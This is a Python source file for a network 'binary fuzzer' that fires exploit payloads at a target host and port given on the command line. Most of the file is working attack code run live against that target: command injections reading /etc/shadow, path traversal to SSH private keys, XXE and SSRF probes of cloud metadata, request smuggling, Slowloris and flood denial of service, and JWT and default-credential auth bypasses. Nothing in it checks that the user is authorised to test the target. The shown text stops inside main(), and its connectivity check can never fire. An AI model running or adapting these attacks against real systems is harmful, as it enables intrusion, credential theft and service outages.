"""
Binary Fuzzer - Comprehensive fuzzer and exploit tester for binary services.

Targets common C/C++ vulnerabilities:
- Buffer overflows (stack & heap)
- Format string attacks
- Integer overflows
- Memory corruption
- Command injection
- Path traversal
- Protocol fuzzing
- Denial of Service patterns
- Race conditions
- Deserialization attacks

Usage:
    python -m security_analyzer.binary_fuzzer --host <IP> --port <PORT>
    python -m security_analyzer.binary_fuzzer --host <IP> --discover
"""

import socket
import ssl
import struct
import time
import json
import random
import string
import concurrent.futures
import urllib.request
import urllib.error
import argparse
import os
import sys
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class AttackCategory(Enum):
    BUFFER_OVERFLOW = "Buffer Overflow"
    FORMAT_STRING = "Format String"
    INTEGER_OVERFLOW = "Integer Overflow"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"
    PROTOCOL_FUZZING = "Protocol Fuzzing"
    DOS = "Denial of Service"
    MEMORY_CORRUPTION = "Memory Corruption"
    RACE_CONDITION = "Race Condition"
    DESERIALIZATION = "Deserialization"
    HTTP_ABUSE = "HTTP Abuse"
    AUTH_BYPASS = "Authentication Bypass"
    INFO_DISCLOSURE = "Information Disclosure"


@dataclass
class BreakAttempt:
    category: AttackCategory
    name: str
    payload_desc: str
    response: str = ""
    crashed: bool = False
    anomaly: bool = False
    error: str = ""
    response_time_ms: float = 0


@dataclass
class BreakReport:
    host: str
    port: int
    attempts: list = field(default_factory=list)
    crashes: int = 0
    anomalies: int = 0
    total_tests: int = 0

    def add(self, attempt: BreakAttempt):
        self.attempts.append(attempt)
        self.total_tests += 1
        if attempt.crashed:
            self.crashes += 1
        if attempt.anomaly:
            self.anomalies += 1


class BinaryFuzzer:
    """Comprehensive fuzzer/breaker for binary services."""

    def __init__(self, host: str, port: int, timeout: int = 5, verbose: bool = True):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.report = BreakReport(host=host, port=port)

    def log(self, msg: str):
        if self.verbose:
            print(f"  {msg}")

    def _tcp_send(self, payload: bytes, timeout: int = None) -> tuple[bytes, float, bool]:
        t = timeout or self.timeout
        start = time.time()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(t)
                s.connect((self.host, self.port))
                s.sendall(payload)
                try:
                    resp = s.recv(65536)
                except socket.timeout:
                    resp = b"<timeout>"
                elapsed = (time.time() - start) * 1000
                return resp, elapsed, False
        except ConnectionResetError:
            return b"<CONNECTION_RESET>", (time.time() - start) * 1000, True
        except BrokenPipeError:
            return b"<BROKEN_PIPE>", (time.time() - start) * 1000, True
        except ConnectionRefusedError:
            return b"<REFUSED>", (time.time() - start) * 1000, True
        except socket.timeout:
            return b"<TIMEOUT>", (time.time() - start) * 1000, False
        except OSError as e:
            return f"<ERROR:{e}>".encode(), (time.time() - start) * 1000, False

    def _http_send(self, method: str, path: str, headers: dict = None,
                   body: bytes = None) -> tuple[int, str, float]:
        url = f"http://{self.host}:{self.port}{path}"
        start = time.time()
        try:
            req = urllib.request.Request(url, data=body, method=method)
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                elapsed = (time.time() - start) * 1000
                return resp.status, resp.read().decode(errors="replace")[:2000], elapsed
        except urllib.error.HTTPError as e:
            elapsed = (time.time() - start) * 1000
            body = ""
            try:
                body = e.read().decode(errors="replace")[:2000]
            except Exception:
                pass
            return e.code, body, elapsed
        except Exception as e:
            return 0, str(e)[:500], (time.time() - start) * 1000

    def _record(self, cat: AttackCategory, name: str, payload_desc: str,
                response: bytes, time_ms: float, crashed: bool):
        resp_str = response.decode(errors="replace")[:500] if isinstance(response, bytes) else str(response)[:500]
        anomaly = (
            crashed
            or b"Segmentation fault" in (response if isinstance(response, bytes) else b"")
            or b"core dump" in (response if isinstance(response, bytes) else b"")
            or b"stack smash" in (response if isinstance(response, bytes) else b"")
            or b"ASAN" in (response if isinstance(response, bytes) else b"")
            or b"heap-buffer-overflow" in (response if isinstance(response, bytes) else b"")
            or b"ERROR" in (response if isinstance(response, bytes) else b"")
            or time_ms > 10000
        )
        attempt = BreakAttempt(
            category=cat, name=name, payload_desc=payload_desc,
            response=resp_str, crashed=crashed, anomaly=anomaly,
            response_time_ms=time_ms,
        )
        self.report.add(attempt)
        status = "CRASH" if crashed else ("ANOMALY" if anomaly else "OK")
        self.log(f"[{status}] {name} ({time_ms:.0f}ms)")

    # --- 1. Buffer Overflow Tests ---

    def test_buffer_overflows(self):
        print("\n[1/13] Buffer Overflow Tests")
        payloads = [
            ("Small overflow (256B)", b"A" * 256),
            ("Medium overflow (1KB)", b"A" * 1024),
            ("Large overflow (4KB)", b"A" * 4096),
            ("Huge overflow (64KB)", b"A" * 65536),
            ("Massive overflow (1MB)", b"A" * (1024 * 1024)),
            ("NUL-interspersed (4KB)", b"A\x00" * 2048),
            ("Stack canary pattern", b"A" * 1024 + struct.pack("<Q", 0x4141414141414141) * 32),
            ("Return address overwrite", b"A" * 1024 + struct.pack("<Q", 0xdeadbeefdeadbeef) * 16),
            ("ROP chain simulation", b"A" * 512 + b"".join(struct.pack("<Q", 0x400000 + i * 0x100) for i in range(64))),
            ("Off-by-one (boundary)", b"A" * 255 + b"\x00"),
            ("Heap spray pattern", (b"\x41" * 16 + b"\x0a") * 4096),
            ("UTF-8 multibyte overflow", ("\u00e9" * 2048).encode("utf-8")),
            ("Mixed NUL + overflow", b"\x00" * 512 + b"A" * 4096),
        ]
        for name, payload in payloads:
            resp, ms, crashed = self._tcp_send(payload)
            self._record(AttackCategory.BUFFER_OVERFLOW, name,
                         f"{len(payload)} bytes", resp, ms, crashed)

    # --- 2. Format String Tests ---

    def test_format_strings(self):
        print("\n[2/13] Format String Tests")
        payloads = [
            ("Basic %x leak", b"%x." * 50),
            ("Stack dump %08x", b"%08x." * 100),
            ("String pointer %s", b"%s" * 20),
            ("Write primitive %n", b"AAAA" + b"%x" * 20 + b"%n"),
            ("%n write chain", b"%08x" * 10 + b"%n%n%n%n"),
            ("Direct param %7$x", b"%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x.%10$x"),
            ("Long format %99999x", b"%99999x"),
            ("Pointer leak %p", b"%p." * 50),
            ("%hn half-write", b"AA%08x%08x%hn"),
            ("Format in HTTP path", b"GET /%x%x%x%x%x%x HTTP/1.0\r\n\r\n"),
            ("Format in header", b"GET / HTTP/1.0\r\nX-Data: %s%s%s%s%s\r\n\r\n"),
            ("Format in POST body", b"POST / HTTP/1.0\r\nContent-Length: 20\r\n\r\n%x%x%x%n%s%p%d"),
            ("Nested format %%x", b"%%x%%n%%s" * 100),
        ]
        for name, payload in payloads:
            resp, ms, crashed = self._tcp_send(payload)
            self._record(AttackCategory.FORMAT_STRING, name,
                         payload[:80].decode(errors="replace"), resp, ms, crashed)

    # --- 3. Integer Overflow Tests ---

    def test_integer_overflows(self):
        print("\n[3/13] Integer Overflow Tests")
        int_payloads = [
            ("INT32_MAX", str(2**31 - 1)),
            ("INT32_MAX + 1", str(2**31)),
            ("UINT32_MAX", str(2**32 - 1)),
            ("UINT32_MAX + 1", str(2**32)),
            ("INT64_MAX", str(2**63 - 1)),
            ("INT64_MAX + 1", str(2**63)),
            ("Negative -1", "-1"),
            ("Negative INT32_MIN", str(-(2**31))),
            ("Zero", "0"),
            ("Huge number (100 digits)", "9" * 100),
            ("Float overflow", "1.7976931348623157e+308"),
            ("NaN", "NaN"),
            ("Infinity", "Infinity"),
            ("-Infinity", "-Infinity"),
        ]
        for name, val in int_payloads:
            resp, ms, crashed = self._tcp_send(val.encode())
            self._record(AttackCategory.INTEGER_OVERFLOW, f"TCP: {name}",
                         val, resp, ms, crashed)
            status, body, ms = self._http_send("GET", f"/?size={val}")
            crashed = status == 0 and "Connection" in body
            self._record(AttackCategory.INTEGER_OVERFLOW, f"HTTP param: {name}",
                         f"/?size={val}",
                         body.encode() if isinstance(body, str) else body,
                         ms, crashed)

    # --- 4. Command Injection Tests ---

    def test_command_injection(self):
        print("\n[4/13] Command Injection Tests")
        injections = [
            ("Semicolon", "; id"),
            ("Pipe", "| id"),
            ("Backtick", "`id`"),
            ("Dollar subshell", "$(id)"),
            ("Ampersand chain", "& id"),
            ("Double ampersand", "&& id"),
            ("Newline + cmd", "test\nid"),
            ("Carriage return", "test\r\nid"),
            ("Null byte + cmd", "test\x00id"),
            ("Subshell whoami", "$(whoami)"),
            ("Backtick whoami", "`whoami`"),
            ("Pipe cat passwd", "| cat /etc/passwd"),
            ("Semicolon cat shadow", "; cat /etc/shadow"),
            ("Curl outbound", "; curl http://127.0.0.1:1"),
            ("Python reverse shell pattern", ";python3 -c 'import os;os.system(\"id\")'"),
            ("ENV variable leak", "; env"),
            ("Process list", "; ps aux"),
            ("Network info", "; ifconfig || ip addr"),
        ]
        for name, payload in injections:
            resp, ms, crashed = self._tcp_send(payload.encode())
            self._record(AttackCategory.COMMAND_INJECTION, f"TCP: {name}",
                         payload, resp, ms, crashed)
            status, body, ms = self._http_send("GET", f"/{payload}")
            interesting = ("uid=" in body or "root:" in body or
                           "ec2-user" in body or status == 0)
            self._record(AttackCategory.COMMAND_INJECTION, f"HTTP path: {name}",
                         payload, body.encode(), ms, crashed=interesting)
            status, body, ms = self._http_send(
                "GET", "/",
                headers={"X-Forwarded-For": payload, "User-Agent": payload}
            )
            self._record(AttackCategory.COMMAND_INJECTION, f"HTTP header: {name}",
                         payload, body.encode(), ms, crashed=False)

    # --- 5. Path Traversal Tests ---

    def test_path_traversal(self):
        print("\n[5/13] Path Traversal Tests")
        traversals = [
            ("Basic ../", "../../../etc/passwd"),
            ("URL encoded", "..%2F..%2F..%2Fetc%2Fpasswd"),
            ("Double encoded", "..%252F..%252F..%252Fetc%252Fpasswd"),
            ("Backslash (Windows)", "..\\..\\..\\etc\\passwd"),
            ("Null byte terminator", "../../../etc/passwd%00.png"),
            ("UTF-8 dot encoding", "..%c0%af..%c0%af..%c0%afetc/passwd"),
            ("Long traversal", "../" * 20 + "etc/passwd"),
            ("/proc/self/environ", "../../../proc/self/environ"),
            ("/proc/self/cmdline", "../../../proc/self/cmdline"),
            ("/proc/self/maps", "../../../proc/self/maps"),
            ("/etc/shadow", "../../../etc/shadow"),
            ("Absolute path", "/etc/passwd"),
            ("Home dir", "../../../home/ec2-user/.ssh/authorized_keys"),
            ("SSH keys", "../../../root/.ssh/id_rsa"),
            ("Config files", "../../../opt/app/config.yaml"),
            ("Log files", "../../../var/log/syslog"),
        ]
        for name, path in traversals:
            status, body, ms = self._http_send("GET", f"/{path}")
            leaked = ("root:" in body or "ec2-user" in body or
                      "ssh-" in body or "BEGIN" in body)
            self._record(AttackCategory.PATH_TRAVERSAL, f"GET: {name}",
                         path, body.encode(), ms, crashed=leaked)
            resp, ms, crashed = self._tcp_send(
                f"GET /{path} HTTP/1.0\r\nHost: {self.host}\r\n\r\n".encode()
            )
            self._record(AttackCategory.PATH_TRAVERSAL, f"TCP: {name}",
                         path, resp, ms, crashed)

    # --- 6. Protocol Fuzzing ---

    def test_protocol_fuzzing(self):
        print("\n[6/13] Protocol Fuzzing Tests")
        payloads = [
            ("Empty payload", b""),
            ("Single NUL", b"\x00"),
            ("All NUL (1KB)", b"\x00" * 1024),
            ("All 0xFF (1KB)", b"\xff" * 1024),
            ("Binary header + text", b"\x00\x01\x02\x03HELLO"),
            ("Random binary (4KB)", bytes(random.randint(0, 255) for _ in range(4096))),
            ("Malformed HTTP", b"INVALID PROTOCOL\r\n\r\n"),
            ("HTTP/0.9", b"GET /\r\n"),
            ("HTTP/2 preface", b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"),
            ("Websocket upgrade", b"GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"),
            ("Partial HTTP", b"GET"),
            ("Only newlines", b"\r\n" * 1000),
            ("Tab characters", b"\t" * 4096),
            ("Mixed control chars", bytes(range(0, 32)) * 128),
            ("Alternating pattern", b"\xaa\x55" * 4096),
            ("Length prefix underflow", struct.pack("<I", 0xFFFFFFFF) + b"A" * 100),
            ("Length prefix zero", struct.pack("<I", 0) + b"A" * 100),
            ("Length prefix negative", struct.pack("<i", -1) + b"A" * 100),
            ("Protobuf-like varint", b"\x80\x80\x80\x80\x80\x01" + b"A" * 100),
            ("MessagePack-like", b"\xdf\xff\xff\xff\xff" + b"A" * 100),
            ("gRPC frame", b"\x00" + struct.pack(">I", 999999) + b"A" * 100),
        ]
        for name, payload in payloads:
            resp, ms, crashed = self._tcp_send(payload)
            self._record(AttackCategory.PROTOCOL_FUZZING, name,
                         f"{len(payload)}B binary", resp, ms, crashed)

    # --- 7. DoS Tests ---

    def test_dos_patterns(self):
        print("\n[7/13] Denial of Service Tests")
        self.log("Testing Slowloris (slow headers)...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.host, self.port))
            s.send(b"GET / HTTP/1.1\r\n")
            for i in range(10):
                s.send(f"X-Header-{i}: {'A' * 100}\r\n".encode())
                time.sleep(0.5)
            s.close()
            self._record(AttackCategory.DOS, "Slowloris (partial headers)",
                         "10 slow headers over 5s", b"<completed>", 5000, False)
        except Exception as e:
            self._record(AttackCategory.DOS, "Slowloris", str(e),
                         str(e).encode(), 0, False)

        resp, ms, crashed = self._tcp_send(
            b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 999999999\r\n\r\nshort"
        )
        self._record(AttackCategory.DOS, "Huge Content-Length mismatch",
                     "CL:999999999, body:5B", resp, ms, crashed)

        resp, ms, crashed = self._tcp_send(
            b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"FFFFFFFE\r\n" + b"A" * 1024 + b"\r\n0\r\n\r\n"
        )
        self._record(AttackCategory.DOS, "Chunked encoding overflow",
                     "chunk size 0xFFFFFFFE", resp, ms, crashed)

        self.log("Testing rapid connection flood...")
        start = time.time()
        crash_count = 0
        for i in range(10):
            resp, ms, crashed = self._tcp_send(b"GET / HTTP/1.0\r\n\r\n", timeout=2)
            if crashed:
                crash_count += 1
        elapsed = (time.time() - start) * 1000
        self._record(AttackCategory.DOS, "Rapid 10-connection flood",
                     f"10 requests, {crash_count} failures",
                     f"{crash_count}/10 failed".encode(), elapsed,
                     crash_count > 5)

        redos_payloads = [
            ("ReDoS: aaa...a!", "a" * 50 + "!"),
            ("ReDoS: nested groups", "(" * 30 + "a" + ")" * 30),
            ("XML bomb", '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><root>&lol3;</root>'),
            ("JSON nesting", '{"a":' * 1000 + '"b"' + '}' * 1000),
            ("Deep JSON array", '[' * 1000 + '1' + ']' * 1000),
        ]
        for name, payload in redos_payloads:
            resp, ms, crashed = self._tcp_send(payload.encode())
            slow = ms > 5000
            self._record(AttackCategory.DOS, name, payload[:80],
                         resp, ms, crashed or slow)

    # --- 8. Memory Corruption ---

    def test_memory_corruption(self):
        print("\n[8/13] Memory Corruption Tests")
        payloads = [
            ("Heap spray (NOP sled)", b"\x90" * 65536),
            ("Shellcode-like pattern", b"\xcc" * 4096),
            ("Free chunk corruption", struct.pack("<QQ", 0x4141414141414141, 0x4242424242424242) * 512),
            ("tcache poison pattern", struct.pack("<Q", 0x0000deadbeef0000) * 1024),
            ("Double pointer deref", struct.pack("<Q", 0) * 512),
            ("Unaligned access", b"\x01" + b"A" * 4095),
            ("Stack pivot gadget", struct.pack("<Q", 0x00007fffffffe000) * 128),
            ("vtable overwrite", struct.pack("<Q", 0x0000414141414141) * 256),
            ("GOT overwrite pattern", struct.pack("<Q", 0x0000000000601028) * 128),
            ("Canary brute force", b"\x00" * 8 + b"A" * 1016),
            ("Large allocation trigger", b"X" * (10 * 1024 * 1024)),
        ]
        for name, payload in payloads:
            resp, ms, crashed = self._tcp_send(payload)
            self._record(AttackCategory.MEMORY_CORRUPTION, name,
                         f"{len(payload)}B", resp, ms, crashed)

    # --- 9. Race Condition Tests ---

    def test_race_conditions(self):
        print("\n[9/13] Race Condition Tests")
        self.log("Testing 20 parallel identical requests...")
        results = []
        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(self._tcp_send, b"GET / HTTP/1.0\r\n\r\n") for _ in range(20)]
            for f in concurrent.futures.as_completed(futures):
                resp, ms, crashed = f.result()
                results.append((resp, crashed))
        elapsed = (time.time() - start) * 1000
        crashes = sum(1 for _, c in results if c)
        self._record(AttackCategory.RACE_CONDITION, "20 parallel identical",
                     f"20 threads, {crashes} crashes",
                     f"{crashes}/20 crashed".encode(), elapsed, crashes > 0)

        ops = [
            b"GET / HTTP/1.0\r\n\r\n",
            b"POST / HTTP/1.0\r\nContent-Length: 5\r\n\r\nhello",
            b"DELETE / HTTP/1.0\r\n\r\n",
            b"PUT / HTTP/1.0\r\nContent-Length: 5\r\n\r\nworld",
        ]
        self.log("Testing mixed parallel operations...")
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(self._tcp_send, random.choice(ops)) for _ in range(20)]
            for f in concurrent.futures.as_completed(futures):
                resp, ms, crashed = f.result()
                results.append((resp, crashed))
        crashes = sum(1 for _, c in results if c)
        self._record(AttackCategory.RACE_CONDITION, "20 mixed parallel ops",
                     f"GET/POST/PUT/DELETE mixed, {crashes} crashes",
                     f"{crashes}/20 crashed".encode(), elapsed, crashes > 0)

    # --- 10. Deserialization Tests ---

    def test_deserialization(self):
        print("\n[10/13] Deserialization Tests")
        payloads = [
            ("JSON: __proto__ pollution", json.dumps({"__proto__": {"admin": True}})),
            ("JSON: constructor pollution", json.dumps({"constructor": {"prototype": {"isAdmin": True}}})),
            ("JSON: huge string value", json.dumps({"data": "A" * 100000})),
            ("JSON: deep nesting", '{"a":' * 500 + '"x"' + '}' * 500),
            ("JSON: negative array index", json.dumps({"arr": [-1]})),
            ("JSON: type confusion", json.dumps({"id": True, "count": "not_a_number", "data": None})),
            ("JSON: unicode escape", json.dumps({"cmd": "\u0000\u0001\u0002"})),
            ("XML: XXE file read",
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
            ("XML: XXE SSRF",
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'),
            ("XML: Billion laughs",
             '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY l "lol"><!ENTITY l2 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">]><root>&l3;</root>'),
            ("XML: CDATA injection", '<root><![CDATA[<script>alert(1)</script>]]></root>'),
            ("Pickle RCE marker", b"\x80\x04\x95" + b"\x00" * 20),
            ("Java serialized header", b"\xac\xed\x00\x05"),
            ("PHP serialized", b'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'),
            ("YAML: code exec", b"!!python/object/apply:os.system ['id']"),
        ]
        for name, payload in payloads:
            if isinstance(payload, str):
                payload = payload.encode()
            for ct in ["application/json", "application/xml", "text/xml",
                       "application/x-www-form-urlencoded"]:
                status, body, ms = self._http_send(
                    "POST", "/",
                    headers={"Content-Type": ct, "Content-Length": str(len(payload))},
                    body=payload,
                )
                leaked = ("root:" in body or "uid=" in body or
                          "ec2-user" in body or "meta-data" in body)
                self._record(AttackCategory.DESERIALIZATION,
                             f"{name} ({ct.split('/')[-1]})",
                             payload[:80].decode(errors="replace"),
                             body.encode(), ms, crashed=leaked)

    # --- 11. HTTP Abuse Tests ---

    def test_http_abuse(self):
        print("\n[11/13] HTTP Abuse Tests")
        tests = [
            ("CL.TE smuggling",
             b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 6\r\n"
             b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
            ("TE.CL smuggling",
             b"POST / HTTP/1.1\r\nHost: x\r\n"
             b"Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nA\r\n0\r\n\r\n"),
            ("CRLF injection in header",
             b"GET / HTTP/1.1\r\nHost: x\r\nX-Inject: val\r\nEvil-Header: injected\r\n\r\n"),
            ("Host header injection",
             b"GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"),
            ("TRACE method", b"TRACE / HTTP/1.1\r\nHost: x\r\n\r\n"),
            ("OPTIONS method", b"OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n"),
            ("CONNECT tunnel", b"CONNECT evil.com:443 HTTP/1.1\r\nHost: x\r\n\r\n"),
            ("Custom method", b"FOOBAR / HTTP/1.1\r\nHost: x\r\n\r\n"),
            ("Long URL (8KB)", f"GET /{'A' * 8192} HTTP/1.1\r\nHost: x\r\n\r\n".encode()),
            ("Long URL (64KB)", f"GET /{'A' * 65536} HTTP/1.1\r\nHost: x\r\n\r\n".encode()),
            ("Many headers (200)", b"GET / HTTP/1.1\r\nHost: x\r\n" +
             b"".join(f"X-H-{i}: {'V' * 100}\r\n".encode() for i in range(200)) + b"\r\n"),
            ("Huge header value", f"GET / HTTP/1.1\r\nHost: x\r\nX-Big: {'A' * 65536}\r\n\r\n".encode()),
            ("X-Forwarded-Host SSRF", b"GET / HTTP/1.1\r\nHost: x\r\nX-Forwarded-Host: 169.254.169.254\r\n\r\n"),
        ]
        for name, payload in tests:
            resp, ms, crashed = self._tcp_send(payload)
            self._record(AttackCategory.HTTP_ABUSE, name,
                         f"{len(payload)}B", resp, ms, crashed)

    # --- 12. Auth Bypass Tests ---

    def test_auth_bypass(self):
        print("\n[12/13] Authentication Bypass Tests")
        endpoints = [
            "/", "/admin", "/api", "/api/v1", "/health", "/healthz",
            "/metrics", "/prometheus", "/debug", "/debug/pprof",
            "/status", "/info", "/env", "/config", "/swagger",
            "/api-docs", "/graphql", "/graphiql", "/console",
            "/actuator", "/actuator/env", "/actuator/health",
            "/internal", "/private", "/secret", "/dashboard",
            "/.env", "/wp-admin", "/phpmyadmin", "/server-status",
        ]
        for ep in endpoints:
            status, body, ms = self._http_send("GET", ep)
            accessible = status in (200, 301, 302, 307)
            self._record(AttackCategory.AUTH_BYPASS, f"GET {ep}",
                         f"HTTP {status}", body[:200].encode(), ms,
                         crashed=accessible and ep not in ("/", "/health", "/healthz"))

        auth_tricks = [
            ("No auth", {}),
            ("Empty Bearer", {"Authorization": "Bearer "}),
            ("Bearer null", {"Authorization": "Bearer null"}),
            ("Bearer admin", {"Authorization": "Bearer admin"}),
            ("Basic admin:admin", {"Authorization": "Basic YWRtaW46YWRtaW4="}),
            ("Basic admin:password", {"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}),
            ("JWT none algo", {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9."}),
            ("X-API-Key: admin", {"X-API-Key": "admin"}),
            ("X-API-Key: test", {"X-API-Key": "test"}),
        ]
        for name, headers in auth_tricks:
            status, body, ms = self._http_send("GET", "/admin", headers=headers)
            bypassed = status in (200, 301, 302)
            self._record(AttackCategory.AUTH_BYPASS, f"Auth: {name}",
                         f"HTTP {status}", body[:200].encode(), ms,
                         crashed=bypassed)

    # --- 13. Info Disclosure Tests ---

    def test_info_disclosure(self):
        print("\n[13/13] Information Disclosure Tests")
        error_triggers = [
            ("404 error page", "/nonexistent_" + "".join(random.choices(string.ascii_lowercase, k=10))),
            ("500 error trigger", "/%00"),
            ("Double slash", "//"),
            ("Dot files", "/.git/config"),
            ("Git HEAD", "/.git/HEAD"),
            ("SVN entries", "/.svn/entries"),
            ("DS_Store", "/.DS_Store"),
            ("Backup files", "/config.bak"),
            ("Source code", "/main.cpp"),
            ("Core dumps", "/core"),
            ("Debug info", "/debug"),
            ("Version endpoint", "/version"),
            ("Build info", "/build-info"),
            ("robots.txt", "/robots.txt"),
            ("sitemap.xml", "/sitemap.xml"),
            ("crossdomain.xml", "/crossdomain.xml"),
            (".well-known/security.txt", "/.well-known/security.txt"),
        ]
        for name, path in error_triggers:
            status, body, ms = self._http_send("GET", path)
            leaky = any(kw in body.lower() for kw in [
                "stack trace", "exception", "error at", "line ",
                "segfault", "core dump", "version", "build",
                "gcc", "g++", "clang", "boost",
                "/home/", "/opt/", "/usr/", "password", "token",
            ])
            self._record(AttackCategory.INFO_DISCLOSURE, name,
                         f"GET {path} -> {status}",
                         body[:300].encode(), ms, crashed=leaky)

    # --- Run All ---

    def run_all(self) -> BreakReport:
        print(f"\n{'='*60}")
        print(f" Binary Fuzzer - Service Security Tester")
        print(f" Target: {self.host}:{self.port}")
        print(f"{'='*60}")

        resp, ms, crashed = self._tcp_send(b"GET / HTTP/1.0\r\n\r\n")
        if b"<TIMEOUT>" in resp and b"<REFUSED>" in resp:
            print(f"\n[!] Cannot connect to {self.host}:{self.port}")
            print(f"    Response: {resp.decode(errors='replace')}")
            return self.report

        tests = [
            self.test_buffer_overflows,
            self.test_format_strings,
            self.test_integer_overflows,
            self.test_command_injection,
            self.test_path_traversal,
            self.test_protocol_fuzzing,
            self.test_dos_patterns,
            self.test_memory_corruption,
            self.test_race_conditions,
            self.test_deserialization,
            self.test_http_abuse,
            self.test_auth_bypass,
            self.test_info_disclosure,
        ]
        for test_fn in tests:
            try:
                test_fn()
            except Exception as e:
                print(f"  [ERROR] {test_fn.__name__}: {e}")

        self._print_summary()
        return self.report

    def _print_summary(self):
        print(f"\n{'='*60}")
        print(f" RESULTS SUMMARY")
        print(f"{'='*60}")
        print(f" Total tests:  {self.report.total_tests}")
        print(f" Crashes:      {self.report.crashes}")
        print(f" Anomalies:    {self.report.anomalies}")
        print(f"{'='*60}")

        if self.report.crashes > 0 or self.report.anomalies > 0:
            print(f"\n FINDINGS:")
            for a in self.report.attempts:
                if a.crashed or a.anomaly:
                    tag = "CRASH" if a.crashed else "ANOMALY"
                    print(f"  [{tag}] {a.category.value}: {a.name}")
                    print(f"         Payload: {a.payload_desc[:100]}")
                    print(f"         Response: {a.response[:150]}")
                    print()

    def generate_report(self, output_dir: str = "./reports"):
        os.makedirs(output_dir, exist_ok=True)

        json_data = {
            "target": f"{self.host}:{self.port}",
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_tests": self.report.total_tests,
            "crashes": self.report.crashes,
            "anomalies": self.report.anomalies,
            "findings": [
                {
                    "category": a.category.value,
                    "name": a.name,
                    "payload": a.payload_desc[:200],
                    "response": a.response[:300],
                    "crashed": a.crashed,
                    "anomaly": a.anomaly,
                    "response_time_ms": a.response_time_ms,
                }
                for a in self.report.attempts
                if a.crashed or a.anomaly
            ],
            "all_tests": [
                {
                    "category": a.category.value,
                    "name": a.name,
                    "crashed": a.crashed,
                    "anomaly": a.anomaly,
                    "response_time_ms": a.response_time_ms,
                }
                for a in self.report.attempts
            ],
        }
        json_path = os.path.join(output_dir, "binary-fuzzer-report.json")
        with open(json_path, "w") as f:
            json.dump(json_data, f, indent=2)

        md_lines = [
            "# Binary Fuzzer Report",
            "",
            f"**Target:** `{self.host}:{self.port}`",
            f"**Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"**Total Tests:** {self.report.total_tests}",
            f"**Crashes:** {self.report.crashes}",
            f"**Anomalies:** {self.report.anomalies}",
            "",
            "---",
            "",
            "## Findings (Crashes & Anomalies)",
            "",
        ]

        by_category = {}
        for a in self.report.attempts:
            if a.crashed or a.anomaly:
                by_category.setdefault(a.category.value, []).append(a)

        if not by_category:
            md_lines.append("No crashes or anomalies detected.")
        else:
            for cat, attempts in sorted(by_category.items()):
                md_lines.append(f"### {cat}")
                md_lines.append("")
                md_lines.append("| Test | Type | Response Time | Response |")
                md_lines.append("|------|------|--------------|----------|")
                for a in attempts:
                    tag = "CRASH" if a.crashed else "ANOMALY"
                    md_lines.append(
                        f"| {a.name} | {tag} | {a.response_time_ms:.0f}ms | "
                        f"`{a.response[:80]}` |"
                    )
                md_lines.append("")

        md_lines.extend([
            "---",
            "",
            "## All Tests Summary",
            "",
            "| Category | Tests | Crashes | Anomalies |",
            "|----------|-------|---------|-----------|",
        ])

        cat_stats = {}
        for a in self.report.attempts:
            s = cat_stats.setdefault(a.category.value, {"total": 0, "crashes": 0, "anomalies": 0})
            s["total"] += 1
            if a.crashed:
                s["crashes"] += 1
            if a.anomaly:
                s["anomalies"] += 1

        for cat, s in sorted(cat_stats.items()):
            md_lines.append(f"| {cat} | {s['total']} | {s['crashes']} | {s['anomalies']} |")

        md_path = os.path.join(output_dir, "binary-fuzzer-report.md")
        with open(md_path, "w") as f:
            f.write("\n".join(md_lines))

        print(f"\nReports saved to:")
        print(f"  {json_path}")
        print(f"  {md_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Binary Fuzzer - Service Security Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python -m security_analyzer.binary_fuzzer --host <IP> --port 8080
  python -m security_analyzer.binary_fuzzer --host <IP> --discover
  python -m security_analyzer.binary_fuzzer --host <IP> --port 8080 --quick
        """,
    )
    parser.add_argument("--host", required=True, help="Target host")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--discover", action="store_true", help="Discover open ports first")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout (default: 5s)")
    parser.add_argument("--output", default="./reports", help="Output directory (default: ./reports)")
